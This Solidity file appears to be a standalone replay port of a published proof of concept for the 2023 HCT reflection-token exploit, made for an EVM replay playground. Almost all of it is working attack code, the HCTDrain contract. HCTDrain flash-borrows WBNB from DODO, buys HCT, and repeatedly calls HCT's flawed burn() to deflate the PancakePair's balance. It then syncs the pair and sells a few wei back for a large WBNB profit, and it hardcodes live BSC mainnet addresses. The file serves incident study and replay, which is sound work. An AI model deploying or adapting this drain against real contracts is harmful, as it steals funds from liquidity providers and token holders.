// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-09-HCT).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest itself is the DODO flash-loan borrower AND the flash-loan
// callback target `DPPFlashLoanCall` lives on the test, so there is no
// standalone attack contract to deploy). This contract is a faithful,
// self-contained copy of that inline attack (testExploit -> run(),
// DPPFlashLoanCall preserved, approveAll() moved into the constructor since
// the original ran it from Foundry's setUp(), which the replay engine never
// calls) so the playground can deploy it and record run(). No cheatcodes are
// used anywhere in the original attack path (only cosmetic console.log calls,
// dropped here) so a straight structural port is sufficient.
//
// Root cause: CoinToken (HCT) is a reflection token whose public burn()
// subtracts a token-space amount from the REFLECTED balance _rOwned[who] and
// from _tTotal, while never touching _rTotal. That inflates the reflection
// rate, silently deflating every OTHER holder's visible balance -- including
// the HCT/WBNB PancakePair's. Flash-borrowing WBNB, buying a huge HCT stack,
// repeatedly burning it (raising the rate), then sync()-ing the pair locks in
// a near-zero HCT reserve while the WBNB reserve is untouched, blowing up
// HCT's marginal price. Selling a few wei of HCT back nets a large WBNB profit.

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface ICoinToken {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function burn(uint256 _value) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakePair {
    function sync() external;
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract HCTDrain {
    IPancakePair constant PancakePair = IPancakePair(0xdbE783014Cb0662c629439FBBBa47e84f1B6F2eD);
    IPancakeRouter constant router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ICoinToken constant HCT = ICoinToken(0x0FDfcfc398Ccc90124a0a41d920d6e2d0bD8CcF5);
    IERC20Like constant WBNB = IERC20Like(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IDPPOracle constant DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    uint256 constant baseAMount = 2_200_000_000_000_000_000_000;

    // Mirrors the original Foundry setUp()'s approveAll() -- runs unrecorded as
    // part of the (unrecorded) deploy phase, exactly like Foundry's setUp()
    // running before the recorded test body.
    constructor() {
        WBNB.approve(address(router), baseAMount);
        HCT.approve(address(router), baseAMount);
    }

    // step 0: flash-borrow 2,200 WBNB from DODO's DPPOracle; the callback below
    // does the whole drain and must repay baseAMount WBNB by the end.
    function run() external {
        DPPOracle.flashLoan(baseAMount, 0, address(this), abi.encode(baseAMount));
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        swapWBNBtoHCT();
        burnHCT();
        PancakePair.sync();
        swapHCTtoWBNB();
        WBNB.transfer(address(DPPOracle), baseAMount);
    }

    // step 1: dump the whole flash-borrowed 2,200 WBNB into the pool for HCT.
    function swapWBNBtoHCT() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(HCT);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            baseAMount, 1, path, address(this), type(uint256).max
        );
    }

    // step 2: the bug -- repeatedly burn() the attacker's own HCT. Each burn
    // subtracts from the REFLECTED balance and from _tTotal without touching
    // _rTotal, inflating the reflection rate and silently deflating every
    // other holder's (including the pair's) visible HCT balance.
    function burnHCT() internal {
        while (true) {
            uint256 bal = HCT.balanceOf(address(this));
            if (bal <= 70) {
                break;
            }
            HCT.burn(bal * 8 / 10 - 1);
        }
    }

    // step 4: sell a few wei of HCT back into the now-degenerate pool for a
    // massively inflated amount of WBNB.
    function swapHCTtoWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(HCT);
        path[1] = address(WBNB);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            HCT.balanceOf(address(this)), 10, path, address(this), type(uint256).max
        );
    }
}
